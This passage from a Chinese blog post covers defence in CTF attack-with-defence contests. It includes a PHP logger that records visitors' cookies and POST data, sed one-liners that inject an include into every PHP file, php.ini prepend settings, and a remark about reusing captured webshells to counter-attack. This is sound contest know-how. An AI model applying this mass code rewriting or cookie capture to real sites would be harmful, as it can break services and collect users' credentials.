+<h4 id="tail命令监控日志"><a href="#tail命令监控日志" class="headerlink" title="tail命令监控日志"></a>tail命令监控日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f [日志文件]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctf@4ef271a9a03b:/tmp$ tail -f log.txt </span><br><span class="line">访问链接：/index.php?</span><br><span class="line">请求方法：GET</span><br><span class="line">Cookie: </span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">POST: </span><br><span class="line"></span><br><span class="line">--------------end-----------------</span><br></pre></td></tr></table></figure>
+
+<h4 id="日志-流量监控"><a href="#日志-流量监控" class="headerlink" title="日志/流量监控"></a>日志/流量监控</h4><blockquote>
+<p>流量监控也是可以使用aoiawd进行，aoiawd还是在后边，或者用别的脚本记录流量，有的比赛也会定时提供上阶段流量</p>
+<p>被上马一定要先备份到本地，再删除、去分析反打别人</p>
+</blockquote>
+<p>网上搜集脚本</p>
+<p>php</p>
+<p>log.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</span><br><span class="line">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];<span class="comment">//记录访问者的ip</span></span><br><span class="line">$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];<span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter = $_SERVER[<span class="string">"QUERY_STRING"</span>];<span class="comment">//访问者要请求的参数</span></span><br><span class="line">$method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>];<span class="comment">//请求方法</span></span><br><span class="line">$time = date(<span class="string">'Y-m-d H:i:s'</span>,time());<span class="comment">//访问时间</span></span><br><span class="line">$post = file_get_contents(<span class="string">"php://input"</span>,<span class="string">'r'</span>);<span class="comment">//接收POST数据</span></span><br><span class="line"></span><br><span class="line">$logadd = <span class="string">"访问者IP："</span>.$ip.<span class="string">"\r\n"</span>.<span class="string">'访问时间：'</span>.$time.<span class="string">"\r\n"</span>.<span class="string">'访问链接：'</span>.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>.<span class="string">"请求方法："</span>.$method.<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$others    = <span class="string">"POST: "</span>.$post.<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line">$fh = fopen(<span class="string">"/tmp/log.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($fh, <span class="string">"-------------start----------------\r\n"</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fwrite($fh,<span class="string">"Cookie: \r\n"</span>.print_r($_COOKIE, <span class="keyword">true</span>).<span class="string">"\r\n"</span>);</span><br><span class="line">fwrite($fh,$others.<span class="string">"\r\n"</span>);</span><br><span class="line">fwrite($fh, <span class="string">"--------------end-----------------\r\n"</span>);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once <span class="string">"/tmp/waf.php"</span>;?&gt;</span></span><br><span class="line">find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name '*.php'|xargs  sed -i '1i&lt;?php require_once "/tmp/log.php";?&gt;'</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>问题：不能监控linux隐藏文件的访问， 比如 .index.php 访问这个文件就检测不到。</p>
+</blockquote>
+<h4 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h4><blockquote>
+<p>注意：被上马一定要先备份到本地，再删除、去分析反打别人</p>
+</blockquote>
+<p>网上收集脚本</p>
+<p><a href="https://www.shuzhiduo.com/A/GBJrKlDG50/" target="_blank" rel="noopener">https://www.shuzhiduo.com/A/GBJrKlDG50/</a></p>
+<p>使用方法</p>
+<ol>
+<li><p>上传到靶机/tmp目录下</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ctf@4ef271a9a03b:/tmp/FileMonitor-master$ python main.py  </span><br><span class="line">    _____________</span><br><span class="line">   &lt; FileMonitor &gt;</span><br><span class="line">    -------------</span><br><span class="line">      /\_)o&lt;</span><br><span class="line">     |       | </span><br><span class="line">     | O . O |</span><br><span class="line">      \_____/</span><br><span class="line">    By CoolCat</span><br><span class="line">      </span><br><span class="line">[08:36:56]:Please enter a directory:/var/www/html/</span><br><span class="line">[08:37:01]:FileMonitor is running...</span><br><span class="line">[08:37:07]:修改了/var/www/html/.a.php Hash为：41f12630a50703b6026654e2de8cada1</span><br><span class="line">[08:37:07]:删除了/var/www/html/.a.php</span><br><span class="line">[08:37:15]:新建了/var/www/html/.a.php</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>监控目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>问题：垃圾日志太多</p>
+</blockquote>
+<h4 id="weblogger（不熟悉暂且不用）"><a href="#weblogger（不熟悉暂且不用）" class="headerlink" title="weblogger（不熟悉暂且不用）"></a>weblogger（不熟悉暂且不用）</h4><p><a href="https://github.com/wupco/weblogger" target="_blank" rel="noopener">一个针对php的web流量抓取、分析的应用。</a></p>
+<p>使用方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/ (or other web dir)</span><br><span class="line"></span><br><span class="line">git clone https://github.com/wupco/weblogger.git</span><br><span class="line"></span><br><span class="line">chmod -R 777 weblogger/</span><br><span class="line"></span><br><span class="line">open http://xxxxx/weblogger/install.php in Web browser</span><br><span class="line"></span><br><span class="line">install it</span><br></pre></td></tr></table></figure>
+
+<h4 id="进程-端口监控-不熟悉暂且不用"><a href="#进程-端口监控-不熟悉暂且不用" class="headerlink" title="进程/端口监控(不熟悉暂且不用)"></a>进程/端口监控(不熟悉暂且不用)</h4><p>网上收集脚本</p>
+<h4 id="部署waf"><a href="#部署waf" class="headerlink" title="部署waf"></a>部署waf</h4><blockquote>
+<p>waf部署需要谨慎，分为两种情况：无check机制、部分检查不允许上通防waf，有些比赛上通防可能会扣掉很多分实在</p>
+</blockquote>
+<ul>
+<li>每个文件前边加 require_once(waf.php);</li>
+<li>改 .user.ini配置文件 auto_prepend_file=<filename>; 包含在文件头auto_append_file=<filename>; 包含在文件尾</filename></filename></li>
+</ul>
+<blockquote>
+<p>注：如果挂了waf出现持续扣分，waf去掉</p>
+</blockquote>
+<p><strong>有root权限</strong></p>
+<p>1.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#每个文件前边加 require_once(waf.php);</span></span><br><span class="line">find /var/www/html -<span class="built_in">type</span> f -path <span class="string">"*.php"</span> | xargs sed -i <span class="string">"s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g"</span></span><br><span class="line"></span><br><span class="line">find /var/www/html -<span class="built_in">type</span> f -path <span class="string">"*.php"</span> | xargs sed -i <span class="string">"s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waf.php\");/g"</span></span><br><span class="line"></span><br><span class="line">上waf：</span><br><span class="line">$ find . -path ./waffffff -prune -o -<span class="built_in">type</span> f -name <span class="string">"*.php"</span> -<span class="built_in">print</span> | xargs sed -i <span class="string">"s/&lt;?php/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/g"</span></span><br><span class="line"></span><br><span class="line">下waf：</span><br><span class="line">$ find . -path ./waffffff -prune -o -<span class="built_in">type</span> f -name <span class="string">"*.php"</span> -<span class="built_in">print</span> | xargs sed -i <span class="string">"s/&lt;?php include_once(\"\/var\/www\/html\/waffffff\/waf.php\");/&lt;?php/g"</span></span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim php.ini</span><br><span class="line"></span><br><span class="line">auto_append_file = <span class="string">"/dir/path/phpwaf.php"</span></span><br><span class="line"></span><br><span class="line">重启Apache或者php-fpm就能生效了。</span><br></pre></td></tr></table></figure>
+
+<p>3.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;;  包含在文件头</span><br><span class="line"></span><br><span class="line">auto_append_file=&lt;filename&gt;;  包含在文件尾</span><br><span class="line">php_value auto_prepend_file <span class="string">"/dir/path/phpwaf.php"</span></span><br></pre></td></tr></table></figure>
+
+<p>注：如果挂了waf出现持续扣分，waf去掉</p>
+<p><strong>只有user权限</strong></p>
+<p>没写系统权限就只能在代码上面下手了，也就是文件包含。</p>
+<p>这钟情况又可以用不同的方式包含。</p>
+<p>1.</p>
+<p>如果是框架型应用，那麽就可以添加在入口文件，例如index.php，</p>
+<p>如果不是框架应用，可以在公共配置文件config.php等相关文件中包含。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">'phpwaf.php'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<p>替换index.php，也就是将index.php改名为index2.php，然后讲phpwaf.php改成index.php。</p>
+<p>当然还没完，还要在原phpwaf.php中包含原来的index.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php -&gt; index2.php</span><br><span class="line">phpwaf.php -&gt;index.php</span><br><span class="line">include(<span class="string">'index2.php'</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>修改权限mysqll用户读表权限上传目录是否可执行的权限</p>
+</li>
+<li><p>部署文件监控脚本php.ini</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = waf.php的路径;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">require_once(&apos;waf.php&apos;);</span><br><span class="line"></span><br><span class="line">常用cms添加waf位置</span><br><span class="line">PHPCMS V9 \phpcms\base.php</span><br><span class="line">PHPWIND8.7 \data\sql_config.php</span><br><span class="line">DEDECMS5.7 \data\common.inc.php</span><br><span class="line">DiscuzX2   \config\config_global.php</span><br><span class="line">Wordpress   \wp-config.php</span><br><span class="line">Metinfo   \include\head.php</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>通用waf</p>
+<p><a href="https://github.com/DasSecurity-HatLab/AoiAWD" target="_blank" rel="noopener">https://github.com/DasSecurity-HatLab/AoiAWD</a></p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Fany</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://fanygit.github.io/2021/11/01/CTF-AWD攻防方法总结/" title="CTF-AWD攻防方法总结">https://fanygit.github.io/2021/11/01/CTF-AWD攻防方法总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-AWD/" rel="tag"># CTF-AWD</a>
+          
+            <a href="/tags/总结/" rel="tag"># 总结</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/29/[GYCTF2020]Easyphp 1/" rel="next" title="BUUCTF-WEB [GYCTF2020]Easyphp 1">
+                <i class="fa fa-chevron-left"></i> BUUCTF-WEB [GYCTF2020]Easyphp 1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/11/02/Java安全学习笔记（一）/" rel="prev" title="Java安全学习笔记（一）">
+                Java安全学习笔记（一） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    <div class="comments" id="comments"></div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/images/tx5.gif" alt="Fany">
+  
+  <p class="site-author-name" itemprop="name">Fany</p>
+  <div class="site-description motion-element" itemprop="description">路虽远，行则必达。</div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">66</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fanygit" title="GitHub &rarr; https://github.com/fanygit" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:483813121@qq.com" title="E-Mail &rarr; mailto:483813121@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+
+  <div class="cc-license motion-element" itemprop="license">
+  
+  
+    
+  
+  
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://leancloud.cn/dashboard/applist.html#/apps" title="https://leancloud.cn/dashboard/applist.html#/apps" rel="noopener" target="_blank">Leancloud</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">P牛</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://drun1baby.github.io/" title="https://drun1baby.github.io/" rel="noopener" target="_blank">崖余</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#防守-amp-加固"><span class="nav-number">1.</span> <span class="nav-text">防守&amp;加固</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#不知道靶机密码的情况"><span class="nav-number">1.1.</span> <span class="nav-text">不知道靶机密码的情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可能会用到的操作"><span class="nav-number">1.2.</span> <span class="nav-text">可能会用到的操作</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh提供rsa公私钥连接方式"><span class="nav-number">1.2.1.</span> <span class="nav-text">ssh提供rsa公私钥连接方式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查看有那些用户"><span class="nav-number">1.2.2.</span> <span class="nav-text">查看有那些用户</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可查看端口对应服务"><span class="nav-number">1.2.3.</span> <span class="nav-text">可查看端口对应服务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查看开了哪些端口-是否存在后门"><span class="nav-number">1.2.4.</span> <span class="nav-text">查看开了哪些端口  是否存在后门</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#关闭端口的方式"><span class="nav-number">1.2.5.</span> <span class="nav-text">关闭端口的方式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#监控日志命令"><span class="nav-number">1.2.6.</span> <span class="nav-text">监控日志命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#scp实现ssh服务上传下载文件"><span class="nav-number">1.2.7.</span> <span class="nav-text">scp实现ssh服务上传下载文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#备份网站目录"><span class="nav-number">1.2.8.</span> <span class="nav-text">备份网站目录</span></a></li><li class="nav-item nav-level-5"><a 